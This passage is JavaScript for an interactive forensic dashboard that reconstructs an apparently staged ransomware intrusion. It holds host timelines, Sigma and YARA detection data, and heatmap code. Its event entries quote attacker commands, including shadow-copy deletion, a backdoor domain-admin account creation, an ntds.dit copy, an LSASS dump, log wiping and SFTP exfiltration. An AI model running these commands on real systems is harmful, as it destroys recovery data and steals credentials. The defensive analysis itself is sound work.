        { t:'20:08:34', d:'4624/3 NTLM logon from 198.51.100.10 — impacket lands' },
        { t:'20:08:44', d:'SVC <b>UnmfmnOL</b> · vssadmin list shadows' },
        { t:'20:08:53', d:'SVC <b>QsYyAARL</b> · vssadmin create shadow ✓' },
        { t:'20:08:55', d:'SVC <b>XCCVTGUb</b> · vssadmin list (GUID)' },
        { t:'20:09:03', d:'SVC <b>SOUwKZNf</b> · cmd /C copy ntds.dit → ZIFylmKF.tmp' },
        { t:'20:09:04', d:'SVC <b>PovLjNTr</b> · vssadmin delete shadows {af18f363}' },
        { t:'20:09:06', d:'5145 · LAFAdmin reads ADMIN$\\Temp\\ZIFylmKF.tmp' },
        { t:'22:10:14', d:'T1490 · vssadmin delete shadows /all /quiet' },
      ]},
      { title: 'Evidence Paths', paths: [
        'C/Windows/System32/winevt/Logs/Security.evtx',
        'C/Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%4Operational.evtx',
        'C/Windows/System32/winevt/Logs/Microsoft-Windows-PowerShell%4Operational.evtx',
        'C/Windows/System32/winevt/Logs/Windows PowerShell.evtx',
        'C/Windows/Temp/ZIFylmKF.tmp (ntds.dit staging · evicted)',
      ]},
    ]
  },
  DC02: {
    name: 'LAF-DC02', ip: '10.3.10.11', role: 'Secondary DC · SYSVOL Weaponized',
    sections: [
      { title: 'Role', body: '<p>Secondary DC. Abused as ransomware delivery channel — <code>\\\\laf-dc02\\sysvol\\IamBatman.exe</code> + <code>sysAV.bat</code> were dropped here and reached from WS01 via a scheduled task.</p>' },
      { title: 'Key Events', events: [
        { t:'20:45:37', d:'4624 · workstation=<b>kali</b> · operator hostname leak via NTLM' },
        { t:'22:09:42', d:'SYSVOL delivery: \\\\laf-dc02\\sysvol\\sysAV.bat fetched by WS01' },
        { t:'22:10:52', d:'T1490 · vssadmin delete shadows /all /quiet (cascade complete)' },
      ]},
      { title: 'Evidence Paths', paths: [
        'C/Windows/SYSVOL/sysvol/LAF.local/.../IamBatman.exe',
        'C/Windows/SYSVOL/sysvol/LAF.local/.../sysAV.bat',
        'C/Windows/System32/winevt/Logs/Security.evtx',
      ]},
    ]
  },
  SVR01: {
    name: 'LAF-SVR01', ip: '10.3.10.12', role: 'File Server · Pivot Hub · Memory Target',
    sections: [
      { title: 'Role', body: '<p>Pivot hub. RDP via Pass-the-Hash after the DisableRestrictedAdmin registry flip. LSASS dump + DonPAPI credential harvest staged here. <code>makecab → data.cab</code> assembled and exfiltrated via FileZilla SFTP. Memory image source for Volatile Verdicts chain.</p>' },
      { title: 'Key Events', events: [
        { t:'19:59:00', d:'\\\\10.3.10.12\\ADMIN$\\rnSylwOz.exe — operator foothold' },
        { t:'20:02:14', d:'net user serviceaccount P@ssw0RD1! /add /domain' },
        { t:'20:03:30', d:'T1003.001 · abedgdaa.dmp LSASS minidump' },
        { t:'20:05→08', d:'DonPAPI enumerates Dashlane folder · T1555' },
        { t:'20:13:26', d:'reg add DisableRestrictedAdmin=0' },
        { t:'20:14:08', d:'rdpclip.exe spawns · PtH RDP live' },
        { t:'20:20:13', d:'Drop msupdate.exe (renamed makecab.exe)' },
        { t:'20:21:09', d:'msupdate.exe /f list.txt /d CabinetName1=data.cab' },
        { t:'20:30:26', d:'fzsftp.exe → 172.236.127.251:22 user=root' },
        { t:'21:08:28', d:'LogDel.bat · wevtutil cl across channels' },
        { t:'22:09:43', d:'vssadmin delete shadows /all /quiet' },
      ]},
      { title: 'Evidence Paths', paths: [
        'C/Windows/System32/winevt/Logs/Security.evtx',
        'C/Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%4Operational.evtx',
        'C/Windows/Temp/abedgdaa.dmp',
        'C/ProgramData/msupdate.exe',
        'C/ProgramData/LogDel.bat',
        'C/Users/LAFAdmin/AppData/Roaming/FileZilla/recentservers.xml',
        'SVR01-memdump/SVR01-memdump.dmp',
      ]},
    ]
  },
  WS01: {
    name: 'LAF-WS01', ip: '10.3.10.13', role: 'Ransomware Ground Zero',
    sections: [
      { title: 'Role', body: '<p>Ransomware detonation host. Transient scheduled task <code>OlgyLYbd</code> with a 1.2-second lifetime registered, fired, and deleted itself — classic impacket-smbexec fingerprint. Reached out to DC02 SYSVOL to fetch the ransomware.</p>' },
      { title: 'Key Events', events: [
        { t:'19:59:00', d:'rnSylwOz.exe (ADMIN$ service exec from SVR01)' },
        { t:'22:09:14', d:'4624/3 LAFAdmin from SVR01 (immediate) · 198.51.100.10 (outer)' },
        { t:'22:09:15', d:'Task <b>OlgyLYbd</b> registered (EID 106)' },
        { t:'22:09:16', d:'Task fires (EID 129/200) · cmd.exe /C cmd /c \\\\laf-dc02\\sysvol\\sysAV.bat' },
        { t:'22:09:16', d:'vssadmin delete shadows /all /quiet' },
        { t:'22:09:17', d:'Task deleted (EID 141)' },
        { t:'22:09:46', d:'<b>T1486</b> IamBatman.exe encrypt C:\\ · .bWqQUx' },
      ]},
      { title: 'Evidence Paths', paths: [
        'C/Windows/System32/Tasks/OlgyLYbd (ephemeral)',
        'C/Windows/System32/winevt/logs/Microsoft-Windows-TaskScheduler%4Operational.evtx',
        'C/Windows/System32/winevt/logs/Security.evtx',
        'C/Windows/System32/winevt/logs/Microsoft-Windows-Sysmon%4Operational.evtx',
        'C/Windows/Temp/OlgyLYbd.tmp (task stdout)',
        'C/Windows/Temp/pRlGOUon.tmp (sysAV.bat output)',
      ]},
    ]
  },
  WS02: {
    name: 'LAF-WS02', ip: '10.3.10.14', role: 'Recon Staging · First Encryption',
    sections: [
      { title: 'Role', body: '<p>Dalton/Donny workstation. RDP-reached from SVR01 via PtH. Advanced IP Scanner sweep of <code>10.3.10.1-254</code>. First <code>IamBatman</code> process actually starts here (21:58:34 crashed, 22:08:40 succeeded).</p>' },
      { title: 'Key Events', events: [
        { t:'20:13→20:45', d:'RDP session from SVR01 (PtH)' },
        { t:'20:46:03', d:'Advanced IP Scanner runtime · ranges in NTUSER.DAT' },
        { t:'22:01:19', d:'Shellbag touch · ransomware staging folder viewed' },
        { t:'21:58:34', d:'First IamBatman.exe — crashed' },
        { t:'21:58:36', d:'First vssadmin delete shadows' },
        { t:'22:08:40', d:'<b>Second IamBatman launch</b> · encryption loop begins ✓' },
        { t:'22:08:58', d:'First .bWqQUx FileCreate visible in Sysmon EID 11' },
      ]},
      { title: 'Evidence Paths', paths: [
        'C/Users/Dalton/AppData/Local/Google/Chrome/User Data/Default/History',
        'C/Users/<user>/AppData/Local/Microsoft/Windows/UsrClass.dat (shellbags)',
        'C/Users/<user>/NTUSER.DAT (Advanced IP Scanner state)',
        'C/Windows/System32/winevt/logs/Security.evtx',
        'C/Windows/System32/winevt/logs/Microsoft-Windows-Sysmon%4Operational.evtx',
      ]},
    ]
  },
  OP: {
    name: 'OPERATOR', ip: '172.236.127.251', role: 'External · Linode/Akamai',
    sections: [
      { title: 'Role', body: '<p>Primary operator origin. Source of HTTP GET injection against IIS; also the SFTP exfil sink (same IP, port 22) and the <code>sourceIPAddress</code> field in all attacker-driven CloudTrail records. Dual-use external infra.</p>' },
      { title: 'Observed Activity', events: [
        { t:'18:51:41', d:'GET injection to CheckStatus.aspx' },
        { t:'18:51→22:10', d:'Sustained ops — webshell, C2, cloud API' },
        { t:'20:30:26', d:'SFTP landing on :22 for data.cab' },
        { t:'21:42:11', d:'STS session from 172.236.127.251' },
      ]},
    ]
  },
  TOOL: {
    name: 'TOOLING VPS + C2', ip: '173.230.136.180', role: 'Linode · C2 Listener (OSS framework, unattributed)',
    sections: [
      { title: 'Role', body: '<p>Attacker-controlled Linode VPS. Served HTTP delivery of <code>so.aspx</code> and <code>iis.exe</code> to IIS. Then ran an <b>AdaptixC2</b> HTTPS listener on :8443 for beacon traffic from the compromised IIS host (memory-resident proof: SVR01 Vol3 netscan for PID 1332; source-to-binary RE match 5-for-5 against Adaptix public repo — see C2 Attribution).</p>' },
      { title: 'Observed Activity', events: [
        { t:'18:51:41', d:'HTTP serve so.aspx to IIS' },
        { t:'18:52:19', d:'HTTP serve iis.exe to IIS' },
        { t:'19:38:02→', d:'C2 beacon receives callback from SolarWinds.exe' },
      ]},
    ]
  },
  SINK: {
    name: 'SFTP EXFIL SINK', ip: '172.236.127.251:22', role: 'FileZilla destination',
    sections: [
      { title: 'Role', body: '<p>Same IP as the operator origin, exposed on :22. FileZilla <code>recentservers.xml</code> on SVR01 captures <code>Protocol=1</code> (SFTP) · <code>User=root</code> · <code>RemotePath=/root</code>.</p>' },
    ]
  },
  ROLE: {
    name: 'iam_role_iisserver', ip: 'sts.amazonaws.com', role: 'EC2 Instance Profile · Attached i-00779ebad43b2470d',
    sections: [
      { title: 'Role', body: '<p>AWS IAM role attached to the IIS EC2 instance. IMDSv2 token theft → session exposes role credentials off-instance. sts:GetCallerIdentity at 21:42:11 · S3 GetObject burst at 21:45:38 · failed persistence (AttachUserPolicy AccessDenied).</p>' },
    ]
  },
  S3: {
    name: 'S3 BUCKET', ip: 'us-east-1', role: 'CloudTrail target · 164 GetObjects · 11,327 bytes',
    sections: [
      { title: 'Role', body: '<p>S3 objects read via <code>aws s3 cp</code> by the stolen STS session. Authoritative count (164) from S3 Access Logs, not CloudTrail data events (which were off by default on this bucket).</p>' },
    ]
  },
};

const overlay = document.getElementById('drawerOverlay');
const drawer = document.getElementById('hostDrawer');
const drawerName = document.getElementById('drawerName');
const drawerIp = document.getElementById('drawerIp');
const drawerRole = document.getElementById('drawerRole');
const drawerBody = document.getElementById('drawerBody');
const drawerClose = document.getElementById('drawerClose');

function openDrawer(host) {
  const d = HOST_DETAIL[host];
  if (!d) return;
  drawerName.textContent = d.name;
  drawerIp.textContent = d.ip;
  drawerRole.textContent = d.role;
  drawerBody.innerHTML = d.sections.map(s => {
    let html = `<h4>${s.title}</h4>`;
    if (s.body) html += s.body;
    if (s.events) {
      html += s.events.map(e => `<div class="evt"><div class="t">${e.t}</div><div class="d">${e.d}</div></div>`).join('');
    }
    if (s.paths) {
      html += s.paths.map(p => `<span class="path">${p}</span>`).join('');
    }
    return html;
  }).join('');
  drawer.classList.add('open');
  overlay.classList.add('open');
  drawer.setAttribute('aria-hidden','false');
}
function closeDrawer() {
  drawer.classList.remove('open');
  overlay.classList.remove('open');
  drawer.setAttribute('aria-hidden','true');
}
const graphSvg = document.querySelector('#sec-graph svg');
const graphClearBtn = document.getElementById('graphClearFocus');
let currentFocusHost = null;

function setGraphFocus(host) {
  if (!graphSvg) return;
  if (!host || currentFocusHost === host) {
    // Toggle off
    graphSvg.classList.remove('graph-focused');
    graphSvg.querySelectorAll('.edge-focus').forEach(e => e.classList.remove('edge-focus'));
    graphSvg.querySelectorAll('.host-focus').forEach(e => e.classList.remove('host-focus'));
    currentFocusHost = null;
    graphClearBtn && graphClearBtn.classList.remove('visible');
    return;
  }
  currentFocusHost = host;
  graphSvg.classList.add('graph-focused');
  const connected = new Set([host]);
  graphSvg.querySelectorAll('.edge-g').forEach(e => {
    const s = e.dataset.src, d = e.dataset.dst;
    const match = (s === host) || (d === host);
    e.classList.toggle('edge-focus', match);
    if (match) { connected.add(s); connected.add(d); }
  });
  graphSvg.querySelectorAll('.host-clickable').forEach(h => {
    h.classList.toggle('host-focus', connected.has(h.dataset.host));
  });
  graphClearBtn && graphClearBtn.classList.add('visible');
}

document.querySelectorAll('.host-clickable').forEach(n => {
  n.addEventListener('click', (e) => {
    e.stopPropagation();
    openDrawer(n.dataset.host);
    setGraphFocus(n.dataset.host);
  });
});
if (graphClearBtn) graphClearBtn.addEventListener('click', () => setGraphFocus(null));
if (graphSvg) graphSvg.addEventListener('click', (e) => {
  // Click on empty SVG background clears focus
  if (e.target === graphSvg) setGraphFocus(null);
});
overlay.addEventListener('click', closeDrawer);
drawerClose.addEventListener('click', closeDrawer);
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') { closeDrawer(); setGraphFocus(null); }
});

/* ====================================================== */
/*          HEATMAP                                       */
/* ====================================================== */
const HM_COLS = 250; // 250 min from 18:50 → 23:00 (covers DD13.5 end-time 22:56 + DD14 KAPE 22:47)
const HM_HOSTS = [
  { key:'IIS',   label:'IIS',   role:'198.51.100.10 · entry' },
  { key:'DC01',  label:'DC01',  role:'10.3.10.10 · primary DC' },
  { key:'DC02',  label:'DC02',  role:'10.3.10.11 · secondary DC' },
  { key:'SVR01', label:'SVR01', role:'10.3.10.12 · file svr · pivot' },
  { key:'WS01',  label:'WS01',  role:'10.3.10.13 · ransomware' },
  { key:'WS02',  label:'WS02',  role:'10.3.10.14 · recon' },
  { key:'CLOUD', label:'CLOUD', role:'aws us-east-1 · sts + s3' },
];
// activity bursts: [startMin, endMin, intensity]
const HM_BURSTS = {
  IIS:  [ [1,3,4], [3,20,2], [26,28,3], [48,50,4], [50,112,1], [112,155,3], [155,170,2] ],
  DC01: [ [73,75,3], [78,80,5], [80,82,2], [200,205,4], [205,240,2] ],
  DC02: [ [115,117,2], [117,135,3], [135,138,2], [200,205,3], [205,210,4], [210,240,2] ],
  SVR01:[ [69,71,3], [72,73,4], [73,75,5], [75,78,3], [78,80,3], [83,84,3], [84,90,4], [90,95,4], [95,100,3], [138,140,3], [199,205,4], [205,235,2], [235,245,2] ],
  WS01: [ [69,71,3], [199,210,5], [210,215,3], [215,240,2] ],
  WS02: [ [83,115,2], [116,130,3], [130,188,1], [188,191,4], [191,198,2], [198,210,5], [210,246,3], [246,248,4] ],
  CLOUD:[ [172,174,3], [175,180,4], [180,210,2] ],
};

// Sigma rule fire cells: [host, minute, ruleName, detail]
// Each Sigma fire: [host, minute, rule, detail, novel?]
// novel=true  → unique to this engagement (no SigmaHQ equivalent) · upstream-PR-worthy (DT.8)
// novel=false → SigmaHQ has a battle-tested equivalent; rule fired here for parity but swap for upstream in production
const HM_SIGMA = [
  // Pre-existing Sigma ruleset
  ['IIS',   48,  'solarwindstftp-service-hijack',   '19:38:02 · SYSTEM via writable-ACL swap + AdaptixC2 first callback (RE-confirmed · Addendum V)', false],
  ['DC01',  79,  'ntds-shadowcopy-copy',            '20:09:03 · impacket smbexec.py --use-vss · cmd /C copy …ShadowCopy*\\Windows\\NTDS\\ntds.dit (DD10.1)', false],
  ['CLOUD', 172, 'cloudtrail-sts-off-instance',     '21:42:11 · STS session from 212.8.249.213 (off-instance)', false],
  ['CLOUD', 176, 'cloudtrail-failed-createaccesskey','~21:46 · AttachUserPolicy / CreateAccessKey jb_aws_cli · LimitExceeded (DD7 corrects: 3 later attempts SUCCEEDED)', false],
  ['CLOUD', 187, 'guardduty-instance-cred-exfil',   '21:57:18 · GuardDuty Sev 8 · InstanceCredentialExfiltration.OutsideAWS · detection worked, response did not (DD18.2 — 11m22s before detonation) · NOVEL rule (no SigmaHQ equivalent)', true],
  ['CLOUD', 191, 'guardduty-instance-cred-exfil',   '22:01:10 · GuardDuty Sev 8 re-fires · same detector · still no human response (DD18.2) · NOVEL', true],
  ['CLOUD', 204, 'guardduty-attacksequence-iam',    '22:14:44 · GuardDuty Sev 9 · AttackSequence:IAM/CompromisedCredentials — highest-severity cloud alert of the incident (DD18.2) · NOVEL (InstanceCredentialExfiltration coverage absent from SigmaHQ)', true],
  ['WS02',  188, 'sysav-ransomware-launch',         '21:58:34 · BOTCHED first IamBatman (; bash-syntax bug, DD12.2)', false],
  ['WS02',  188, 'vssadmin-shadow-wipe-pre-ransom', '21:58:36 · vssadmin delete shadows + 2× bcdedit · 10-min SIEM window before encryption (DD12.2)', false],
  ['WS02',  198, 'sysav-ransomware-launch',         '22:08:40 · successful IamBatman via atexec.py task mIglpUCO (DD12.1)', false],
  ['WS01',  199, 'sysav-ransomware-launch',         '22:09:16 · cmd /c \\\\laf-dc02\\sysvol\\sysAV.bat via atexec.py task OlgyLYbd', false],
  ['SVR01', 199, 'sysav-ransomware-launch',         '22:09:46 · atexec.py task pRlGOUon fan-out from SVR01 orchestrator (DD12.1/4)', false],
  ['DC01',  200, 'sysav-ransomware-launch',         '22:10:14 · atexec.py task Kypxgyzl · NTDS host wiped', false],
  ['DC02',  202, 'sysav-ransomware-launch',         '22:10:52 · atexec.py task WZWkUVGL · DC02 last (SYSVOL owner)', false],
  // DD11 — Process injection & smoking-gun LSASS chain
  ['SVR01', 73,  'lsass-floating-shellcode-dump',   '20:03:30 · Explorer TID 10020 opens LSASS 0x1010 · UNKNOWN CallTrace · abedgdaa.dmp written (DD11.1) · NOVEL (Explorer+UNKNOWN() combination absent from SigmaHQ)', true],
  // DD10 — AD persistence chain on SVR01 during DC01 dump · NOVEL pair-correlation
  ['SVR01', 72,  'domain-admin-backdoor-create',    '20:02:14 · Explorer.EXE → net user serviceaccount P@ssw0RD1! /add /domain (DD10.2) · NOVEL (pair-correlation with DA-add, no time-windowed SigmaHQ equivalent)', true],
  ['DC01',  73,  'da-group-elevation',              '20:03:05 · 4728 serviceaccount → Domain Admins (authoritative on DC · DD10.2) · NOVEL (pair-correlation within 5-min window)', true],
  ['SVR01', 83,  'disable-restrictedadmin-pth',     '20:13:26 · reg add DisableRestrictedAdmin=0 (hands-on · opens PtH-over-RDP · DD10.2)', false],
  // Addendum V YARA rules — disk + memory binary matches
  ['IIS',   26,  'yara-smbpivot-beacon-solarwinds', '19:16:52 · Null404_SMBPivot_Beacon_SolarWinds_rnSylwOz — IMPHASH 37E28CA3 + MinGW + pipe template + ~188 KB (Addendum V)'],
  ['SVR01', 71,  'yara-injectedloader-vad-0xa60000','20:01:16 · Null404_InjectedLoader_VAD_0xA60000 — memory-resident stub, MinGW runtime failure string + ApiLoader pattern (Addendum V)'],
  ['DC01',  78,  'yara-impacket-servicepattern',    '20:08:44 · Null404_Impacket_SecretsDump_ServicePattern — ImagePath regex, service-name-agnostic, catches all 5 stages (Addendum C+V)'],
];

// Annotation markers at key UTC moments (minute since 18:50)
const HM_KEYEVENTS = [
  { m: 0,   label: '13:39:16 · PRE-AXIS (5 h 11 m before this grid) · author-IP scenario-validation hit on CheckStatus.aspx from 216.82.9.162 — same Linode tool-server the attacker uses at 18:51. Three indicators tie to scenario-author infra: same URL + jb.exe crosswalks (jb_aws_cli · JackOfAllHacks-Triages) + 18,035 console-reads. Proves attacker-infra is scenario-provisioned (DD23.6)', impact: false },
  { m: 1,   label: '18:51 · Webshell drop (13 min after true initial access at 18:38:29 — DD23, pre-axis)', impact: false },
  { m: 43,  label: '19:33 · Kerberos WAN · earliest signal (Addendum N)', impact: false },
  { m: 47,  label: '19:37 · Donny reboot (Addendum U)', impact: false },
  { m: 48,  label: '19:38 · SYSTEM + AdaptixC2 beacon (RE-confirmed)', impact: false },
  { m: 69,  label: '19:59 · ADMIN$ service exec · beacon on SVR01', impact: false },
  { m: 71,  label: '20:01 · CreateRemoteThread → Explorer PID 1332 TID 10020 (Addendum L)', impact: false },
  { m: 72,  label: '20:02 · serviceaccount/P@ssw0RD1! DA backdoor created (DD10.2)', impact: false },
  { m: 73,  label: '20:03 · LSASS dump via TID 10020 → abedgdaa.dmp (Addendum L · DD11.1)', impact: false },
  { m: 79,  label: '20:09 · NTDS.dit exfil complete via smbexec.py --use-vss (Addendum C · DD10.1)', impact: false },
  { m: 83,  label: '20:13 · DisableRestrictedAdmin=0 (PtH-over-RDP enabled · DD10.2)', impact: false },
  { m: 84,  label: '20:14 · Second RDP + rdpclip.exe on SVR01 (DD11.2)', impact: false },
  { m: 86,  label: '20:16 · Masqueraded Firefox.exe on LAFAdmin Desktop (T1036.005 · DD11.3)', impact: false },
  { m: 100, label: '20:30 · FileZilla SFTP exfil (Addendum F)', impact: false },
  { m: 133, label: '21:03 · IamBatman dropped to SYSVOL — DFSR auto-replicates (Addendum R)', impact: false },
  { m: 138, label: '21:08 · LogDel.bat · wiped 6 channels, missed Sysmon (Addendum H)', impact: false },
  { m: 172, label: '21:42 · STS off-instance · IMDSv2 3-step (Addendum X)', impact: false },
  { m: 176, label: '21:46 · CreateAccessKey SUCCEEDED on 3 users — stockpile persistence, never used in capture window (DD7 · DD16 S-tier)', impact: false },
  { m: 179, label: '21:49 · 164 × s3:GetObject — DECOY honeypot bucket, alert-fatigue tradecraft (DD17 S-tier)', impact: false },
  { m: 187, label: '21:57 · GuardDuty Sev 8 fires · 11-min missed-response window begins (DD18.2) · 1 of only 3 real fires vs 383 synthetic samples = 0.75% signal-to-noise (DD19)', impact: false },
  { m: 188, label: '21:58 · BOTCHED first detonation (; bash-syntax bug · DD12.2)', impact: true  },
  { m: 198, label: '22:08 · Successful IamBatman via atexec.py — 6,023 files + 2,530 notes (DD12 · DD13) · 11m22s after GuardDuty Sev 8 fire, no response fired', impact: true  },
  { m: 200, label: '22:10 · Shadow-wipe cascade · 5-host fan-out (Addendum S)', impact: true  },
  { m: 204, label: '22:14 · GuardDuty Sev 9 AttackSequence fires — highest-severity alert, still no human response (DD18.2)', impact: false },
  { m: 206, label: '22:16 · v2 "detonation start" — actually mid-cascade (DD12 correction)', impact: false },
  { m: 222, label: '22:12 → 22:47 · CTF-author KAPE collection (localuser@RED1 · DD14)', impact: false },
  { m: 246, label: '22:56 · ACTUAL last encrypt: brndlog.txt on WS02 (DD13.5 · +10 min past v2)', impact: true  },
];
// Phase bands for the top bar (start, end, label, class)
const HM_PHASES = [
  [1, 48, 'I · INGRESS', 'p1'],
  [48, 72, 'BEACON IDLE', 'p1'],
  [72, 80, 'II · NTDS', 'p3'],
  [80, 140, 'III · LATERAL + EXFIL', 'p2'],
  [140, 178, 'VI · CLOUD', 'p4'],
  [178, 205, 'V · IMPACT', 'p5'],
];

function minuteToClock(m) {
  const totalMin = BASE_H * 60 + BASE_M + m;
  const h = Math.floor(totalMin / 60) % 24;
  const mm = totalMin % 60;
  return `${String(h).padStart(2,'0')}:${String(mm).padStart(2,'0')}`;
}
function intensityAt(host, m) {
  const bursts = HM_BURSTS[host] || [];
  let i = 0;
  for (const [a,b,v] of bursts) if (m >= a && m < b && v > i) i = v;
  return i;
}

(function buildHeatmap() {
  const grid = document.getElementById('heatmapGrid');
  const phases = document.getElementById('heatmapPhases');
  const keyEvents = document.getElementById('heatmapKeyEvents');
  [phases, keyEvents].forEach(el => { if (el) el.style.setProperty('--cols', HM_COLS); });

  // Phase band row
  let ph = '';
  HM_PHASES.forEach(([a,b,label,cls]) => {
    const span = b - a;
    ph += `<div class="heatmap-phase-bar ${cls}" style="grid-column: span ${span};">${label}</div>`;
  });
  phases.innerHTML = ph;
  phases.style.gridTemplateColumns = `repeat(${HM_COLS}, 1fr)`;

  // Key-events annotation row
  if (keyEvents) {
    keyEvents.style.gridTemplateColumns = `repeat(${HM_COLS}, 1fr)`;
    HM_KEYEVENTS.forEach(ke => {
      const d = document.createElement('div');
      d.className = 'hm-ke' + (ke.impact ? ' impact' : '');
      d.style.gridColumn = `${ke.m + 1} / span 1`;
      d.innerHTML = `<span class="tip">${ke.label}</span>`;
      d.addEventListener('click', () => {
        setScrubber(ke.m * 60);
        document.getElementById('sec-graph').scrollIntoView({behavior:'smooth', block:'start'});
      });
      keyEvents.appendChild(d);
    });
  }

  // Sigma fires indexed by "host|minute"
  const sigmaIdx = {};
  HM_SIGMA.forEach(([host, m, rule, detail, novel]) => {
    const k = `${host}|${m}`;
    (sigmaIdx[k] = sigmaIdx[k] || []).push({ rule, detail, novel: !!novel });
  });

  const tip = document.getElementById('heatmapTip');
  const htT = document.getElementById('htT');
  const htE = document.getElementById('htE');
  HM_HOSTS.forEach(h => {
    const lab = document.createElement('div');
    lab.className = 'heatmap-row-label';
    lab.innerHTML = `${h.label}<span class="role">${h.role}</span>`;
    grid.appendChild(lab);

    const row = document.createElement('div');
    row.className = 'heatmap-row';
    row.style.gridTemplateColumns = `repeat(${HM_COLS}, 1fr)`;
    for (let m = 0; m < HM_COLS; m++) {
      const cell = document.createElement('div');
      cell.className = 'heatmap-cell';
      const i = intensityAt(h.key, m);
      if (i > 0) cell.dataset.i = String(i);
      cell.dataset.m = m;
      cell.dataset.h = h.key;
      const sig = sigmaIdx[`${h.key}|${m}`];
      if (sig) cell.dataset.sigma = sig.length;
      cell.addEventListener('mouseenter', (e) => {
        const clk = minuteToClock(m);
        htT.textContent = `${h.label} · ${clk}`;
        let e2 = i === 0 ? 'quiet' : `intensity ${i}/5 — ${['','background','minor','active','heavy','extreme'][i]}`;
        if (sig) e2 += `  ·  SIGMA: ${sig.map(s => `${s.novel ? '[NOVEL] ' : ''}${s.rule}`).join(', ')}`;
        htE.textContent = e2;
        tip.classList.add('show');
      });
      cell.addEventListener('mousemove', (e) => {
        tip.style.left = e.clientX + 'px';
        tip.style.top  = e.clientY + 'px';
      });
      cell.addEventListener('mouseleave', () => tip.classList.remove('show'));
      cell.addEventListener('click', () => {
        setScrubber(m * 60);
        document.getElementById('sec-graph').scrollIntoView({behavior:'smooth', block:'start'});
      });
      row.appendChild(cell);
    }
    grid.appendChild(row);
  });

  // Sigma overlay row
  const sigLab = document.createElement('div');
  sigLab.className = 'heatmap-row-label';
  sigLab.style.color = 'var(--green)';
  sigLab.innerHTML = `SIGMA<span class="role">green ring = rule fires · amber ring = NOVEL (upstream-PR-worthy per DT.8)</span>`;
  grid.appendChild(sigLab);
  const sigRow = document.createElement('div');
  sigRow.className = 'heatmap-sigma';
  sigRow.style.gridTemplateColumns = `repeat(${HM_COLS}, 1fr)`;
  for (let m = 0; m < HM_COLS; m++) {
    const cell = document.createElement('div');
    // find any host matching this minute
    const fires = HM_SIGMA.filter(s => s[1] === m);
    if (fires.length) {
      const anyNovel = fires.some(f => f[4]);
      cell.className = anyNovel ? 'hm-sigma-mark novel' : 'hm-sigma-mark';
      cell.title = fires.map(f => `${f[4] ? '[NOVEL] ' : ''}${f[2]} · ${f[3]}`).join('\n');
      cell.addEventListener('click', () => {
        setScrubber(m * 60);
        document.getElementById('sec-graph').scrollIntoView({behavior:'smooth', block:'start'});
      });
    }
    sigRow.appendChild(cell);
  }
  grid.appendChild(sigRow);

  // Axis ticks
  grid.appendChild(document.createElement('div'));
  const axis = document.createElement('div');
  axis.className = 'heatmap-axis';
  axis.style.gridTemplateColumns = `repeat(${HM_COLS}, 1fr)`;
  for (let m = 0; m < HM_COLS; m += 15) {
    const t = document.createElement('div');
    t.className = 'tk';
    t.style.gridColumn = `span 15`;
    t.textContent = minuteToClock(m);
    axis.appendChild(t);
  }
  grid.appendChild(axis);

  // Wire jump buttons
  document.querySelectorAll('.heatmap-jump').forEach(b => {
    b.addEventListener('click', () => {
      const sec = toSec(b.dataset.jump);
      setScrubber(sec);
      document.getElementById('sec-graph').scrollIntoView({behavior:'smooth', block:'start'});
    });
  });
})();

/* ====================================================== */
/*          ATT&CK ↔ TIMELINE BIDIRECTIONAL LINKING       */
/* ====================================================== */
function flashScroll(el) {
  if (!el) return;
  el.scrollIntoView({behavior:'smooth', block:'center'});
  el.classList.remove('flash');
  void el.offsetWidth; // reflow to restart animation
  el.classList.add('flash');
  setTimeout(() => el.classList.remove('flash'), 1900);
}

function jumpToTTP(id) {
  const tiles = document.querySelectorAll('.ttp .tech-id');
  let hit = null;
  for (const t of tiles) {
    if (t.textContent.includes(id)) { hit = t.closest('.ttp'); break; }
  }
  flashScroll(hit);
}

function jumpToFirstEventWithTTP(id) {
  const events = document.querySelectorAll('.event .desc');
  for (const d of events) {
    if (d.textContent.includes(id)) { flashScroll(d.closest('.event')); return; }
  }
}

(function autolinkDescriptions() {
  // Wrap T-codes and EID tokens in clickable links inside every event description
  const TTP_RE = /\b(T\d{4}(?:\.\d{3})?)\b/g;
  const EID_RE = /\b(EID\s+\d{2,5})\b/g;

  document.querySelectorAll('.event .desc').forEach(d => {
    d.innerHTML = d.innerHTML
      .replace(TTP_RE, '<a class="ttp-link" data-ttp="$1" href="#sec-ttp" title="Jump to ATT&CK matrix">$1</a>')
      .replace(EID_RE, '<span class="eid-link" title="EVTX / Sysmon event id">$1</span>');
  });

  document.querySelectorAll('.ttp-link').forEach(l => {
    l.addEventListener('click', (e) => {
      e.preventDefault();
      jumpToTTP(l.dataset.ttp);
    });
  });

  // Make every matrix tile clickable, flash-scrolling to the first proving event
  document.querySelectorAll('.ttp').forEach(t => {
    const idEl = t.querySelector('.tech-id');
    if (!idEl) return;
    const first = idEl.textContent.match(/T\d{4}(?:\.\d{3})?/);
    if (!first) return;
    const id = first[0];
    t.dataset.ttp = id;
    t.classList.add('clickable');
    t.title = `Click to find the first event proving ${id}`;
    t.addEventListener('click', () => jumpToFirstEventWithTTP(id));
  });
})();

/* ====================================================== */
/*          AUTO-XREF · wrap inline Addendum text as      */
/*          compact green pills linked to their target    */
/*          ( symbol removed — addenda use plain prose)  */
/* ====================================================== */
(function autoXref() {
  // Regexes to match reference phrases (order matters — most-specific first)
  const PATTERNS = [
    // "Addendum DD5" / "Addendum DD5.1" / "Addendum AA" / "Addendum Ω"
    { rx: /\bAddendum\s+(DD[0-9](?:\.[0-9])?|[A-ZΩ]{1,2})\b/g, href: () => '#sec-corrections' },
    // "Addenda A–Z" / "Addenda A-Z" (range)
    { rx: /\bAddenda\s+[A-ZΩ]\s*[–\-]\s*[A-ZΩ]\b/g, href: () => '#sec-corrections' },
  ];
  // Elements to skip entirely (code, pre, existing links, chapter nav, legend)
  const SKIP_TAGS = new Set(['SCRIPT','STYLE','CODE','PRE','A','KBD','BUTTON','TEXTAREA','INPUT']);
  const SKIP_CLASSES = ['xref','chapter-nav','ttp-link','heatmap-jump','speed-pick','transport','ledger-filter-pills'];

  function shouldSkip(node) {
    let n = node;
    while (n && n !== document.body) {
      if (SKIP_TAGS.has(n.nodeName)) return true;
      if (n.classList) {
        for (const c of SKIP_CLASSES) if (n.classList.contains(c)) return true;
      }
      n = n.parentNode;
    }
    return false;
  }

  function walk(root) {
    const walker = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, {
